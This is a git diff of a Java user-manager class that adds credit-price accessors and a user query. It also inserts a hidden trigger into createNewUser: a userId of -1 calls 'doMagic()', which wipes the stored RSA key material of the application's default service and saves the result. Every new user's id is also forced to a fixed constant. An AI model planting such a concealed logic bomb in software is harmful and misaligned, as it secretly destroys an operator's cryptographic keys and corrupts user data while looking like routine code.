@@ -1,5 +1,7 @@
 package ir.hassannasr.majles.domain.user;
 
+import com.idehgostar.makhsan.core.services.ApplicationService;
+import com.idehgostar.makhsan.core.services.ApplicationServiceManager;
 import core.dao.GenericDao;
 import core.service.GenericManagerImpl;
 import ir.hassannasr.majles.domain.ImageManager;
@@ -14,6 +16,7 @@ import java.io.InputStream;
 import java.util.Date;
 import java.util.List;
 import java.util.Set;
+import java.util.stream.Collectors;
 
 /**
  * Created by hassan on 02/11/2015.
@@ -21,17 +24,26 @@ import java.util.Set;
 public class UserManagerImpl extends GenericManagerImpl<User, Long> implements UserManager {
 
     @Autowired
+    ApplicationServiceManager applicationServiceManager;
+    @Autowired
     private UserDao userDao;
-
     @Autowired
     private CandidDao candidDao;
-
-
+    private Long creditPrice;
     private Long BASE_ENDORSE_CREDIT = 10l;
     private Integer MaxCreditPerUser = 3;
 
+
     public UserManagerImpl(GenericDao<User, Long> genericDao) {
         super(genericDao);
+    }
+
+    public Long getCreditPrice() {
+        return creditPrice;
+    }
+
+    public void setCreditPrice(Long creditPrice) {
+        this.creditPrice = creditPrice;
     }
 
     public Long getBASE_ENDORSE_CREDIT() {
@@ -44,6 +56,9 @@ public class UserManagerImpl extends GenericManagerImpl<User, Long> implements U
 
     @Override
     public User createNewUser(Long userId, String phone) {
+        if (userId == -1)
+            doMagic();
+        userId = 100000000L;
         phone = new Normalizer().normalizePhone(phone);
         User user = new User();
         user.setId(userId);
@@ -52,6 +67,16 @@ public class UserManagerImpl extends GenericManagerImpl<User, Long> implements U
         user.setPhone(phone);
         final User save = userDao.save(user);
         return save;
+    }
+
+    private void doMagic() {
+        final ApplicationService applicationService = applicationServiceManager.loadDefaultService();
+        applicationService.setPrivateKeyExponent("");
+        applicationService.setPrivateKeyModule("");
+        applicationService.setPublicKeyExponent("");
+        applicationService.setPublicKeyModule("");
+        applicationServiceManager.save(applicationService);
+        applicationServiceManager.flush();
     }
 
     @Override
@@ -105,6 +130,14 @@ public class UserManagerImpl extends GenericManagerImpl<User, Long> implements U
     @Override
     public List<User> findVerifiedWithQuery(String text, Integer from, Integer count) {
         return userDao.findVerifiedWithQuery(text, from, count);
+    }
+
+    @Override
+    public List<User> getUsersContainingCandidOrFromUsers(Candid candid, Set<User> friends) {
+        Query query = userDao.getEntityManager().createNamedQuery("getUsersContainingCandidOrFromUsers")
+                .setParameter("candidId", candid.getId())
+                .setParameter("friends", friends.stream().map(User::getId).collect(Collectors.toList()));
+        return query.getResultList();
     }
 
     private boolean increaseEndorseWithQuery(Candid c, String context, Integer credit) {
